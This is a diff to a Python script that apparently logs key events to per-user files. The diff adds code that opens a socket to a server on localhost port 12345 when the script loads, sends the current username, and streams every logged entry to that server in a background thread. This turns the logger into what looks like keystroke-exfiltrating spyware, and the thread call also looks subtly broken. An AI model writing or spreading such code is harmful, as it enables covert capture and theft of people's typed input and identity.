@@ -3,8 +3,12 @@ from datetime import datetime
 import os
 import threading
 import getpass
+import socket
 
-#gloabl var
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+server_address = ('localhost', 12345)
+client_socket.connect(server_address)
+client_socket.sendall(str(getpass.getuser()).encode())
 
 def checkLogsPath(path):
     if os.path.exists(path) == False:
@@ -39,9 +43,16 @@ def writeToFileHuman(lPath, lName, strh):
             strh = strh.removesuffix(" down)\n")
     else:
         return 0
+    
+    thread_write_server = threading.Thread(target=writeToServer, args=strh)
+    thread_write_server.start()
+
     newLog = open(lPath + lName, "a")
     newLog.write(strh)
     newLog.close()
+
+def writeToServer(mes):
+    client_socket.sendall(mes.encode())
 
 def main():
     tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
